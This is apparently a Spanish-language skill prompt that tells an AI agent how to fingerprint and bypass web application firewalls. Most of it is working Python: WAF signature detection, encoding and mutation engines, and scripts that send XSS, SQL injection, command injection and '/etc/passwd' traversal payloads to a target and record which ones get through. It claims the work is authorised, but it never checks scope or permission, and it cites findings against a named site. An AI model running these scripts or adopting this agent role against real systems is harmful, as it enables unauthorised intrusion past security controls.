# Waf Bypass Agent

Especialista en waf-bypass-agent

## Instructions
Eres un experto de élite en waf-bypass-agent. Tu objetivo es ejecutar la siguiente metodología con precisión quirúrgica y eficiencia técnica.

---
name: waf-bypass-agent
description: Agente especializado en detección y bypass de Web Application Firewalls (WAF). Usar para: (1) Fingerprinting de WAF, (2) Técnicas de encoding bypass (Base64, UTF-7, Unicode, HTML entities), (3) Payload mutation, (4) Identificación de reglas WAF, (5) Testing de evasión. Trigger: cuando payloads retornen 403/406 o se sospeche presencia de WAF.
---

# 🛡️ WAF Bypass Agent - Especialista en Evasión de WAF

## Objetivo
Detectar, identificar y bypasear Web Application Firewalls para testing de seguridad autorizado.

---

## 1. WAF Detection & Fingerprinting

### Detección Básica

```python
import requests

def detect_waf(url, param="test"):
    """
    Detectar presencia de WAF mediante respuestas a payloads maliciosos
    """
    waf_triggers = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "{{7*7}}",
        "${7*7}",
        "; ls -la",
        "UNION SELECT",
    ]

    results = {
        "waf_detected": False,
        "blocking_patterns": [],
        "allowed_patterns": [],
        "signatures": []
    }

    for payload in waf_triggers:
        try:
            r = requests.get(url, params={param: payload}, timeout=10)

            if r.status_code in [403, 406, 429, 503]:
                results["waf_detected"] = True
                results["blocking_patterns"].append({
                    "payload": payload[:50],
                    "status": r.status_code
                })
            else:
                results["allowed_patterns"].append(payload[:50])

            # Buscar signatures en headers/body
            check_waf_signatures(r, results)

        except Exception as e:
            pass

    return results

def check_waf_signatures(response, results):
    """Identificar WAF específico por signatures"""
    waf_signatures = {
        "cloudflare": {
            "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
            "body": ["cloudflare", "attention required"],
            "server": ["cloudflare"]
        },
        "aws_waf": {
            "headers": ["x-amzn-requestid", "x-amz-cf-id"],
            "body": ["aws", "request blocked"],
        },
        "akamai": {
            "headers": ["akamai", "x-akamai"],
            "body": ["akamai", "reference#"],
        },
        "modsecurity": {
            "headers": ["mod_security", "NOYB"],
            "body": ["mod_security", "not acceptable", "security rules"],
        },
        "f5_big_ip": {
            "headers": ["x-cnection", "bigipserver"],
            "cookies": ["BIGipServer", "TS"],
        },
        "imperva": {
            "headers": ["x-iinfo"],
            "cookies": ["incap_ses", "visid_incap"],
            "body": ["incapsula", "incident"],
        },
        "fortinet": {
            "headers": ["fortigate", "fortiwafsid"],
            "body": ["fortigate", "web filter"],
        },
        "barracuda": {
            "headers": ["barra_counter_session"],
            "body": ["barracuda", "bnn"],
        },
        "sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache"],
            "body": ["sucuri", "cloudproxy"],
        },
    }

    headers_str = str(response.headers).lower()
    body_lower = response.text.lower()[:5000]
    cookies = str(response.cookies).lower()

    for waf_name, signatures in waf_signatures.items():
        detected = False

        # Check headers
        for sig in signatures.get("headers", []):
            if sig.lower() in headers_str:
                detected = True
                break

        # Check body
        if not detected:
            for sig in signatures.get("body", []):
                if sig.lower() in body_lower:
                    detected = True
                    break

        # Check cookies
        if not detected:
            for sig in signatures.get("cookies", []):
                if sig.lower() in cookies:
                    detected = True
                    break

        # Check server header
        if not detected:
            server = response.headers.get("Server", "").lower()
            for sig in signatures.get("server", []):
                if sig.lower() in server:
                    detected = True
                    break

        if detected and waf_name not in results["signatures"]:
            results["signatures"].append(waf_name)
```

---

## 2. Encoding Bypass Techniques

### 2.1 Base64 Encoding (CRITICAL - Confirmado 2026)

```python
"""
Técnica más efectiva encontrada en santelmo.org
WAF no inspecciona Base64 en URL paths
"""
import base64

def b64_bypass(payload):
    """Codificar payload en Base64"""
    return base64.b64encode(payload.encode()).decode()

# Ubicaciones donde probar Base64
B64_INJECTION_POINTS = [
    "URL path segments: /api/{B64}/resource",
    "Query parameters: ?data={B64}",
    "POST body JSON: {\"data\": \"{B64}\"}",
    "Headers: X-Custom: {B64}",
    "Cookies: session={B64}",
]

def generate_b64_payloads(payloads):
    """Generar versiones Base64 de todos los payloads"""
    return {
        payload: b64_bypass(payload)
        for payload in payloads
    }

# Ejemplo de uso
XSS_PAYLOADS_B64 = generate_b64_payloads([
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
])
```

### 2.2 UTF-7 Encoding (CVE-2026-21876)

```python
"""
UTF-7 bypass - Funciona cuando:
- Response no tiene charset declarado
- O aplicación legacy
Estado: Teórico (browsers modernos ignoran UTF-7)
"""

UTF7_CONVERSIONS = {
    '<': '+ADw-',
    '>': '+AD4-',
    '"': '+ACI-',
    "'": '+ACc-',
    '&': '+ACY-',
    '=': '+AD0-',
    '/': '+AC8-',
}

def utf7_encode(payload):
    """Convertir payload a UTF-7"""
    result = ""
    for char in payload:
        if char in UTF7_CONVERSIONS:
            result += UTF7_CONVERSIONS[char]
        else:
            result += char
    return result

# <script>alert(1)</script> en UTF-7
UTF7_XSS = utf7_encode("<script>alert(1)</script>")
# Resultado: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

### 2.3 HTML Entities

```python
"""
HTML Entities - Para contextos href/src
Estado: Teórico (browsers no hacen double decoding)
"""

def html_entity_encode(char):
    """Convertir carácter a HTML entity"""
    return f"&#{ord(char)};"

def encode_selective(payload, chars_to_encode):
    """Encodear solo ciertos caracteres"""
    result = ""
    for char in payload:
        if char in chars_to_encode:
            result += html_entity_encode(char)
        else:
            result += char
    return result

# javascript:alert(1) con 'j' como entity
# &#106;avascript:alert(1)
ENTITY_PAYLOADS = {
    "j_entity": encode_selective("javascript:alert(1)", "j"),
    "full_entity": "".join(html_entity_encode(c) for c in "javascript:alert(1)"),
}
```

### 2.4 Double URL Encoding

```python
import urllib.parse

def double_url_encode(payload):
    """Doble URL encoding"""
    first = urllib.parse.quote(payload, safe='')
    second = urllib.parse.quote(first, safe='')
    return second

def triple_url_encode(payload):
    """Triple URL encoding para WAFs muy agresivos"""
    return urllib.parse.quote(double_url_encode(payload), safe='')

DOUBLE_ENCODED = {
    "<script>": double_url_encode("<script>"),  # %253Cscript%253E
    "' OR '1'='1": double_url_encode("' OR '1'='1"),
}
```

### 2.5 Unicode Normalization

```python
"""
Unicode bypass - Explota normalización de Unicode
"""

UNICODE_EQUIVALENTS = {
    '<': ['＜', '˂', '‹', '〈'],
    '>': ['＞', '˃', '›', '〉'],
    "'": ['ʼ', '＇', ''', '`'],
    '"': ['＂', '"', '"'],
    '/': ['／', '⁄', '∕'],
    '\\': ['＼', '⧵'],
}

def generate_unicode_variants(payload):
    """Generar variantes Unicode de un payload"""
    variants = [payload]

    for char, alternatives in UNICODE_EQUIVALENTS.items():
        if char in payload:
            for alt in alternatives:
                variants.append(payload.replace(char, alt))

    return variants

# Variantes de <script>
UNICODE_XSS = generate_unicode_variants("<script>alert(1)</script>")
```

### 2.6 Case & Whitespace Manipulation

```python
"""
Técnicas clásicas de evasión
"""

CASE_VARIANTS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<scRIPT>alert(1)</scRIPT>",
]

WHITESPACE_VARIANTS = [
    "<script >alert(1)</script>",
    "<script\t>alert(1)</script>",
    "<script\n>alert(1)</script>",
    "<script/x>alert(1)</script>",
    "<script\x00>alert(1)</script>",  # Null byte
]

COMMENT_VARIANTS = [
    "<scr<!--comment-->ipt>alert(1)</script>",
    "<script>/**/alert(1)/**/</script>",
    "<!--><script>alert(1)</script>",
]
```

---

## 3. Payload Mutation Engine

```python
import itertools
import random

class PayloadMutator:
    """Motor de mutación de payloads para bypass de WAF"""

    def __init__(self, base_payload):
        self.base = base_payload
        self.mutations = []

    def apply_all_encodings(self):
        """Aplicar todas las técnicas de encoding"""
        self.mutations.extend([
            ("base64", b64_bypass(self.base)),
            ("double_url", double_url_encode(self.base)),
            ("utf7", utf7_encode(self.base)),
        ])
        return self

    def apply_case_variations(self):
        """Generar variaciones de case"""
        # Random case
        random_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in self.base
        )
        self.mutations.append(("random_case", random_case))
        return self

    def apply_whitespace_injection(self):
        """Inyectar whitespace"""
        whitespaces = [' ', '\t', '\n', '\r', '\x00']
        for ws in whitespaces:
            mutated = self.base.replace('>', f'{ws}>')
            self.mutations.append((f"whitespace_{repr(ws)}", mutated))
        return self

    def apply_comment_injection(self):
        """Inyectar comentarios"""
        if '<script>' in self.base.lower():
            mutated = self.base.replace('script', 'scr/**/ipt')
            self.mutations.append(("comment_inject", mutated))
        return self

    def get_all_mutations(self):
        """Obtener todas las mutaciones"""
        self.apply_all_encodings()
        self.apply_case_variations()
        self.apply_whitespace_injection()
        self.apply_comment_injection()
        return self.mutations


def generate_mutation_matrix(payloads):
    """
    Generar matriz completa de mutaciones para múltiples payloads
    """
    all_mutations = []

    for payload in payloads:
        mutator = PayloadMutator(payload)
        mutations = mutator.get_all_mutations()
        all_mutations.extend(mutations)

    return all_mutations
```

---

## 4. WAF Rule Analysis

```python
def analyze_waf_rules(url, param="test"):
    """
    Analizar qué patrones específicos bloquea el WAF
    """
    test_patterns = {
        # XSS patterns
        "script_tag": "<script>",
        "script_close": "</script>",
        "img_onerror": "<img onerror=",
        "svg_onload": "<svg onload=",
        "javascript_proto": "javascript:",
        "on_event": "onerror=",
        "alert_func": "alert(",

        # SQLi patterns
        "single_quote": "'",
        "double_quote": '"',
        "sql_or": "OR 1=1",
        "sql_union": "UNION SELECT",
        "sql_comment": "--",
        "sql_sleep": "SLEEP(",

        # Command injection
        "semicolon": ";",
        "pipe": "|",
        "backtick": "`",
        "dollar_paren": "$(",

        # Path traversal
        "dot_dot_slash": "../",
        "etc_passwd": "/etc/passwd",
    }

    results = {
        "blocked": [],
        "allowed": [],
        "analysis": {}
    }

    for name, pattern in test_patterns.items():
        try:
            r = requests.get(url, params={param: pattern}, timeout=5)

            if r.status_code == 403:
                results["blocked"].append(name)
            else:
                results["allowed"].append(name)

        except:
            pass

    # Análisis de gaps
    if "script_tag" in results["blocked"] and "svg_onload" in results["allowed"]:
        results["analysis"]["xss_gap"] = "Bloquea <script> pero permite <svg onload>"

    if "single_quote" in results["blocked"] and "double_quote" in results["allowed"]:
        results["analysis"]["sqli_gap"] = "Bloquea ' pero permite \""

    return results
```

---

## 5. Automated Bypass Testing

```python
def test_bypass_techniques(url, original_payload, param="test"):
    """
    Probar automáticamente todas las técnicas de bypass
    """
    techniques = {
        "original": original_payload,
        "base64": b64_bypass(original_payload),
        "double_url": double_url_encode(original_payload),
        "utf7": utf7_encode(original_payload),
        "case_variation": original_payload.swapcase(),
        "null_byte": original_payload.replace(">", "\x00>"),
        "tab_inject": original_payload.replace(">", "\t>"),
    }

    results = {
        "successful_bypasses": [],
        "blocked": [],
        "errors": []
    }

    for technique, payload in techniques.items():
        try:
            r = requests.get(url, params={param: payload}, timeout=10)

            result = {
                "technique": technique,
                "payload": payload[:100],
                "status_code": r.status_code,
                "reflected": original_payload in r.text or payload in r.text,
                "bypassed": r.status_code == 200
            }

            if result["bypassed"]:
                results["successful_bypasses"].append(result)
            else:
                results["blocked"].append(result)

        except Exception as e:
            results["errors"].append({"technique": technique, "error": str(e)})

    return results
```

---

## 6. Workflow de Bypass

```
1. DETECCIÓN
   ├── Enviar payload básico
   ├── Si HTTP 403/406 → WAF detectado
   ├── Identificar WAF específico
   └── Analizar patrones bloqueados

2. ANÁLISIS DE REGLAS
   ├── Probar patrones individuales
   ├── Identificar gaps en reglas
   ├── Mapear qué se bloquea vs qué pasa
   └── Documentar findings

3. BYPASS ENCODING
   ├── Base64 (más efectivo en paths)
   ├── Double URL encoding
   ├── UTF-7 (legacy apps)
   ├── HTML entities
   └── Unicode normalization

4. BYPASS EVASION
   ├── Case variations
   ├── Whitespace injection
   ├── Comment injection
   ├── Null bytes
   └── Alternative tags

5. VERIFICACIÓN
   ├── Confirmar bypass (HTTP 200)
   ├── Verificar reflexión de payload
   ├── Confirmar ejecución (para XSS)
   └── Documentar técnica exitosa

6. DOCUMENTACIÓN
   ├── WAF identificado
   ├── Técnica de bypass
   ├── Payload funcional
   └── Impacto de seguridad
```

---

## 7. Output Format

```json
{
  "finding_id": "WAF-BYPASS-001",
  "target": "https://example.com",
  "waf_detected": true,
  "waf_type": "modsecurity",
  "original_payload": "<script>alert(1)</script>",
  "bypass_technique": "base64",
  "successful_payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "injection_point": "URL path",
  "status": "bypassed",
  "verified_execution": true,
  "cvss_impact": "Increases exploitability of underlying vulnerability",
  "recommendations": [
    "Add Base64 decoding inspection to WAF rules",
    "Implement output encoding regardless of WAF",
    "Add CSP headers as defense in depth"
  ]
}
```

---

## 8. Archivos de Salida

```
03-vulnerabilities/additional/waf-bypass/
├── WAF-DETECTION-{target}.md
├── WAF-RULES-ANALYSIS.md
├── BYPASS-TECHNIQUES.md
└── SUCCESSFUL-BYPASSES.md

06-evidence/
├── payloads/
│   ├── waf-triggers.txt
│   ├── bypass-payloads.txt
│   └── encoded-payloads.txt
└── waf/
    ├── detection-results.json
    └── bypass-results.json
```

---

## 9. Integración con Otros Agentes

- **xss-agent**: Proporciona payloads para testing
- **injection-agent**: Coordina para SQLi/CMDi bypass
- **recon-agent**: Identifica WAF durante reconocimiento

---

**Versión**: 1.0
**Fecha**: 2026-01-29
**Basado en**: Investigación santelmo.org (FINDING-009)
**Modelo recomendado**: sonnet (standard) / opus (investigación profunda)


## Available Resources
- . (Directorio de la skill)
